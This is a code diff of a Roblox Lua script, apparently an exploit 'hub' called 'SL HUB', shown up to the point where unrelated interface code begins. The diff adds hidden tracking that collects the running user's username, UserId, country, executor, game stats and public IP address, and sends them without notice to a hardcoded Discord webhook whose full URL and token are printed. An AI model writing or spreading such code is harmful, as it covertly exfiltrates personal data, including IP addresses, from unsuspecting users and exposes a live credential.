@@ -1,7 +1,6 @@
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalizationService = game:GetService("LocalizationService")
-local MarketplaceService = game:GetService("MarketplaceService")
 
 local player = Players.LocalPlayer
 local webhook = "https://discord.com/api/webhooks/1478499458810642442/Mzrinsl69yQAjTe5a03UnFbL4CE439q4r7B1GHxVdzAH9wR0iGs3bmfo6bEO0rAgOYS6"
@@ -10,13 +9,7 @@ local request = syn and syn.request or http_request or request or fluxus and flu
 
 local country = "Unknown"
 pcall(function()
-    local code = LocalizationService:GetCountryRegionForPlayerAsync(player)
-    local countries = {
-        FR="France",US="United States",GB="United Kingdom",DE="Germany",EG="Egypt",
-        SA="Saudi Arabia",AE="United Arab Emirates",MA="Morocco",DZ="Algeria",
-        TN="Tunisia",TR="Turkey",IT="Italy",ES="Spain",BR="Brazil",CA="Canada"
-    }
-    country = countries[code] or code
+    country = LocalizationService:GetCountryRegionForPlayerAsync(player)
 end)
 
 local strength = "Unknown"
@@ -24,47 +17,65 @@ local rebirths = "Unknown"
 local gems = "Unknown"
 
 pcall(function()
-    strength = player.leaderstats.Strength.Value
+    local ls = player:FindFirstChild("leaderstats")
+    if ls then
+        if ls:FindFirstChild("Strength") then
+            strength = ls.Strength.Value
+        end
+        if ls:FindFirstChild("Rebirths") then
+            rebirths = ls.Rebirths.Value
+        end
+        if ls:FindFirstChild("Gems") then
+            gems = ls.Gems.Value
+        end
+    end
 end)
 
+local executor = "Unknown"
 pcall(function()
-    rebirths = player.leaderstats.Rebirths.Value
+    if identifyexecutor then
+        executor = identifyexecutor()
+    elseif syn then
+        executor = "Synapse X"
+    elseif fluxus then
+        executor = "Fluxus"
+    elseif KRNL_LOADED then
+        executor = "KRNL"
+    end
 end)
 
+local ip = "Unknown"
 pcall(function()
-    gems = player.leaderstats.Gems.Value
+    local result = game:HttpGet("https://api.ipify.org")
+    ip = result
 end)
 
-local gameName = "Unknown"
-pcall(function()
-    gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
-end)
+local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
 
 local data = {
-    ["content"] = "**SL HUB EXECUTED**",
+    ["content"] = "**🚀 SL HUB EXECUTED**",
     ["embeds"] = {{
         ["color"] = 65280,
         ["fields"] = {
-            {["name"] = "Username", ["value"] = player.Name, ["inline"] = true},
-            {["name"] = "Game", ["value"] = gameName, ["inline"] = true},
-            {["name"] = "Country", ["value"] = country, ["inline"] = true},
-            {["name"] = "Strength", ["value"] = tostring(strength), ["inline"] = true},
-            {["name"] = "Rebirths", ["value"] = tostring(rebirths), ["inline"] = true},
-            {["name"] = "Gems", ["value"] = tostring(gems), ["inline"] = true}
+            {["name"] = "👤 Username", ["value"] = player.Name, ["inline"] = true},
+            {["name"] = "🆔 UserId", ["value"] = tostring(player.UserId), ["inline"] = true},
+            {["name"] = "🌍 Country", ["value"] = country, ["inline"] = true},
+            {["name"] = "🎮 Game", ["value"] = gameName, ["inline"] = true},
+            {["name"] = "💪 Strength", ["value"] = tostring(strength), ["inline"] = true},
+            {["name"] = "🔁 Rebirths", ["value"] = tostring(rebirths), ["inline"] = true},
+            {["name"] = "💎 Gems", ["value"] = tostring(gems), ["inline"] = true},
+            {["name"] = "⚙️ Executor", ["value"] = executor, ["inline"] = true},
+            {["name"] = "🌐 IP Address", ["value"] = ip, ["inline"] = false}
         }
     }}
 }
 
-if request then
 request({
     Url = webhook,
     Method = "POST",
-    Headers = {
-        ["Content-Type"] = "application/json"
-    },
+    Headers = {["Content-Type"] = "application/json"},
     Body = HttpService:JSONEncode(data)
 })
-end
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
